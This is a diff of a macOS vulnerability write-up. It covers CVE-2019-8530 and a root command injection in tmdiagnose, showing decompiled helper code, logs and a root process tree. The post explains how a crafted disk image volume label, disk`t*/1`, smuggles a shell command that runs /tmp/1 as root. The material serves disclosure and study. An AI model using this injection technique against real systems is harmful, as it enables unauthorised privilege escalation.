@@ -22,20 +22,8 @@ So I started looking at these services:
 
 Functionalities of these helpers are similar. Let's take a closer look at `timemachine.helper`. The interface is extremely simple:
 
-```objectivec
-➜ ~ r2 /System/Library/PrivateFrameworks/DiagnosticExtensions.framework/PlugIns/osx-timemachine.appex/Contents/XPCServices/timemachinehelper
- — You crackme up!
-[0x100001830]> aaa
-[x] Analyze all flags starting with sym. and entry0 (aa)
-[x] Analyze function calls (aac)
-[x] Analyze len bytes of instructions for references (aar)
-[x] Constructing a function name for fcn.* and sym.func.* functions (aan)
-[x] Type matching analysis for all functions (afta)
-[x] Use -AA or aaaa to perform additional experimental analysis.
-[0x100001830]> icc
+```objc
 @interface HelperDelegate :
-{
-}
 - (char) listener:shouldAcceptNewConnection:
 - (void) runDiagnosticWithDestinationDir:replyURL:
 @end
@@ -43,7 +31,47 @@ Functionalities of these helpers are similar. Let's take a closer look at `timem
 
 It simply takes an `NSURL` as a destination directory to run the command `/usr/bin/tmdiagnose -r -w -f` on it, then copies the file that matches a regular expression to the destination parameter.
 
-<p class="outstanding"><img src="/img/2019-04-13-rootpipe-reborn-part-i/26VFI8kkb9ORKZL8r8BRGw.png"></p>
+```objc
+// -[HelperDelegate runDiagnosticWithDestinationDir:replyURL:]
+
+bin = objc_retain(CFSTR("/usr/bin/tmdiagnose"));
+args[0] = CFSTR("-w");
+args[1] = CFSTR("-r");
+args[2] = CFSTR("-f");
+
+// ...
+r = objc_retain(CFSTR("\\.(tmdiagnostic|tmdiagnose)(\\.zip)?$"));
+err = 0LL;
+regex = objc_msgSend(&OBJC_CLASS___NSRegularExpression, "regularExpressionWithPattern:options:error:", r, 1LL, &err);
+
+// ...
+v12 = objc_msgSend(&OBJC_CLASS___NSTask, "alloc");
+v41 = objc_msgSend(v12, "init");
+objc_msgSend(v41, "setLaunchPath:", bin);
+objc_msgSend(v41, "setArguments:", v49);
+objc_msgSend(v41, "setStandardOutput:", handle);
+v13 = objc_msgSend(&OBJC_CLASS___NSPipe, "pipe");
+v32 = objc_retainAutoreleasedReturnValue(v13);
+objc_msgSend(v41, "setStandardError:", v32);
+objc_release(v32);
+objc_msgSend(v41, "setTerminationHandler:", 0LL);
+objc_msgSend(v41, "launch");
+objc_msgSend(v41, "waitUntilExit");
+objc_storeStrong(&v52, 0LL);
+if (!(unsigned int)objc_msgSend(v41, "terminationStatus") ) {
+    v24 = objc_msgSend(
+            &OBJC_CLASS___DEUtils,
+            "findEntriesInDirectory:createdAfter:matchingPattern:",
+            location,
+            v48,
+            _regex);
+    v26 = objc_retainAutoreleasedReturnValue(v24);
+    v25 = objc_msgSend(v26, "lastObject");
+    v39 = objc_retainAutoreleasedReturnValue(v25);
+    objc_release(v26);
+    cb->invoke(cb, v39);
+}
+```
 
 While it doesn't perform any check on the destination, you can put random garbage (the diagnostic logs) to any existing directory without rootless protection. The other helpers have the similar problem. Apple patched this flaw as CVE-2019-8530:
 
@@ -67,23 +95,23 @@ But what I want is a root shell!
 
 The flaw resides in thetmdiagnose binary, which is not too hard to reverse. Its implementation is just some external shell commands wrapped in NSTask calls and the terminal output is honest:
 
-> 2018-06-24 18:03:46.131 tmdiagnose[15529:a03] Executing `/usr/sbin/spindump -notarget 15 -file /private/var/tmp/cc@ant.tmdiagnostic/system_state_18.03.46/spindump.txt`
-> 2018-06-24 18:03:48.206 tmdiagnose[15529:1d03] Executing `/usr/bin/fs_usage -w -t 10 -e tmdiagnose`
-> 2018-06-24 18:04:10.392 tmdiagnose[15529:4d03] Executing `/bin/ps auxh`
-> 2018-06-24 18:04:10.652 tmdiagnose[15529:4d03] Executing `/usr/bin/top -l 10`
-> 2018-06-24 18:04:20.631 tmdiagnose[15529:5203] Executing `/usr/bin/powermetrics -i 1000 -n 10 — show-all`
-> 2018-06-24 18:04:31.227 tmdiagnose[15529:a03] Executing `/usr/bin/sample -file /private/var/tmp/cc@ant.tmdiagnostic/samples/backupd.txt backupd 5`
-> 2018-06-24 18:04:36.915 tmdiagnose[15529:a03] Executing `/usr/bin/sample -file /private/var/tmp/cc@ant.tmdiagnostic/samples/Finder.txt Finder 5`
-> 2018-06-24 18:04:42.351 tmdiagnose[15529:1f03] Executing `/bin/ls -la /Volumes/`
-> 2018-06-24 18:04:42.418 tmdiagnose[15529:1f03] Executing `/bin/df -H`
-> 2018-06-24 18:04:42.486 tmdiagnose[15529:1f03] Executing `/sbin/mount`
-> 2018-06-24 18:04:42.556 tmdiagnose[15529:1f03] Executing `/usr/sbin/diskutil list`
-> 2018-06-24 18:04:42.692 tmdiagnose[15529:1f03] Executing `/usr/sbin/diskutil cs list`
-> 2018-06-24 18:04:42.760 tmdiagnose[15529:1f03] Executing `/usr/sbin/diskutil apfs list`
-> 2018-06-24 18:04:42.956 tmdiagnose[15529:1f03] Executing `/bin/bash -c /usr/sbin/diskutil list | /usr/bin/awk '/disk/ {system("/usr/sbin/diskutil info "$NF); print "*********************"}'`
-> 2018-06-24 18:06:54.482 mddiagnose[15688:1755714] Executing '/usr/local/bin/ddt mds'…
-> 2018-06-24 18:06:54.485 mddiagnose[15688:1755714] Executing '/usr/local/bin/ddt mds_stores'…
-> 2018-06-24 18:06:54.485 mddiagnose[15688:1755714] Executing '/usr/local/bin/ddt corespotlightd'…Did you see the bug here?
+    2018-06-24 18:03:46.131 tmdiagnose[15529:a03] Executing `/usr/sbin/spindump -notarget 15 -file /private/var/tmp/cc@ant.tmdiagnostic/system_state_18.03.46/spindump.txt`
+    2018-06-24 18:03:48.206 tmdiagnose[15529:1d03] Executing `/usr/bin/fs_usage -w -t 10 -e tmdiagnose`
+    2018-06-24 18:04:10.392 tmdiagnose[15529:4d03] Executing `/bin/ps auxh`
+    2018-06-24 18:04:10.652 tmdiagnose[15529:4d03] Executing `/usr/bin/top -l 10`
+    2018-06-24 18:04:20.631 tmdiagnose[15529:5203] Executing `/usr/bin/powermetrics -i 1000 -n 10 — show-all`
+    2018-06-24 18:04:31.227 tmdiagnose[15529:a03] Executing `/usr/bin/sample -file /private/var/tmp/cc@ant.tmdiagnostic/samples/backupd.txt backupd 5`
+    2018-06-24 18:04:36.915 tmdiagnose[15529:a03] Executing `/usr/bin/sample -file /private/var/tmp/cc@ant.tmdiagnostic/samples/Finder.txt Finder 5`
+    2018-06-24 18:04:42.351 tmdiagnose[15529:1f03] Executing `/bin/ls -la /Volumes/`
+    2018-06-24 18:04:42.418 tmdiagnose[15529:1f03] Executing `/bin/df -H`
+    2018-06-24 18:04:42.486 tmdiagnose[15529:1f03] Executing `/sbin/mount`
+    2018-06-24 18:04:42.556 tmdiagnose[15529:1f03] Executing `/usr/sbin/diskutil list`
+    2018-06-24 18:04:42.692 tmdiagnose[15529:1f03] Executing `/usr/sbin/diskutil cs list`
+    2018-06-24 18:04:42.760 tmdiagnose[15529:1f03] Executing `/usr/sbin/diskutil apfs list`
+    2018-06-24 18:04:42.956 tmdiagnose[15529:1f03] Executing `/bin/bash -c /usr/sbin/diskutil list | /usr/bin/awk '/disk/ {system("/usr/sbin/diskutil info "$NF); print "*********************"}'`
+    2018-06-24 18:06:54.482 mddiagnose[15688:1755714] Executing '/usr/local/bin/ddt mds'…
+    2018-06-24 18:06:54.485 mddiagnose[15688:1755714] Executing '/usr/local/bin/ddt mds_stores'…
+    2018-06-24 18:06:54.485 mddiagnose[15688:1755714] Executing '/usr/local/bin/ddt corespotlightd'…Did you see the bug here?
 
 There are two exploitable bugs.
 
@@ -116,7 +144,7 @@ Is the shell command really controllable?
  2: APFS Volume Preboot 44.5 MB disk1s2
  3: APFS Volume Recovery 517.0 MB disk1s3
  4: APFS Volume VM 4.3 GB disk1s4
- ```
+```
 
 The only controllable column is the NAME. We can create a disk image (*.dmg) and customize its label by using `-volname` parameter of hdiutil. Mounting such an image does not require root privilege.
 
@@ -124,11 +152,22 @@ But the problem is, the `$NF` variable points to the last column, the IDENTIFIER
 
 Just don't give up now. I used to play web challenges in CTFs years ago so I remember there's a trick call [CRLF injection](https://www.owasp.org/index.php/CRLF_Injection). So let's add a line break to the volume name: `hello\nworld`. Now hello is the last column.
 
-![](/img/2019-04-13-rootpipe-reborn-part-i/OJMCK5UKZ1gjBc1XKzNXCg.png)
+```
+/dev/disk2 (disk image):
+   #:                       TYPE NAME                    SIZE       IDENTIFIER
+   0:      GUID_partition_scheme                        +860.2 KB   disk2
+   1:                 Apple_APFS hello
+world           819.2 KB    disk2s1
+```
 
 Volume label also supports special chars like \n\`$, so we can inject the payload here. But whitespaces will be treated as splitter and break the payload. Besides, the label is limited to be shorter than 23 chars (including the NULL terminator), otherwise it'll be truncated:
 
-![](/img/2019-04-13-rootpipe-reborn-part-i/KndFoJPwQEFSlcNq5RpO3w.png)
+```objc
+if (0x16 < label.length) {
+    truncated = [label substringToIndex: 0x13];
+    label = [NSString stringWithFormat:@"%@", truncated];
+}
+```
 
 So the label must:
 
@@ -142,7 +181,16 @@ Since we have bash support now, wildcard comes to the rescue. The working dir is
 
 The final payload is disk`t*/1` to execute /tmp/1.
 
-![](/img/2019-04-13-rootpipe-reborn-part-i/pMqZJGJO0hRC2y_MoOnjQg.png)
+```
+|-+= 89190 root /System/Library/PrivateFrameworks/DiagnosticExtensions.framework/PlugIns/osx-timemachine.appex/Contents/XPCServices/timemachinehelper
+| \-+= 89191 root /usr/bin/tmdiagnose -W -r -f /tmp
+|   \-+= 89488 root /bin/bash -c /usr/sbin/diskutil list I /usr/bin/awk '/disk/ {system("/usr/sbin/diskutil info "$NF): print "*********************"}'
+|     \-+- 89490 root /usr/bin/awk /disk/ {system("/usr/sbin/diskutil info "SNF); print "*********************"}
+|       \-+- 89506 root sh -c /usr/sbin/diskutil info disk't*/1'
+|         \-+- 89507 root sh -c /usr/sbin/diskutil info disk't*/1
+|           \-+- 89508 root tmp/1
+|             \--= 89527 root /usr/bin/hdiutil eject /dev/disk2
+```
 
 > Time Machine
 >
@@ -162,4 +210,4 @@ This bug can be exploited in the following steps:
 
 It takes about 2 min to trigger the root command because you have to wait for some time costing commands to finish. Anyways, it's freaking reliable.
 
-![](/img/2019-04-13-rootpipe-reborn-part-i/Pcc6QzYLjwpcicaZ4utWFQ.png)
+<p class="full"><img src="/img/2019-04-13-rootpipe-reborn-part-i/Pcc6QzYLjwpcicaZ4utWFQ.png" alt="poc"></p>
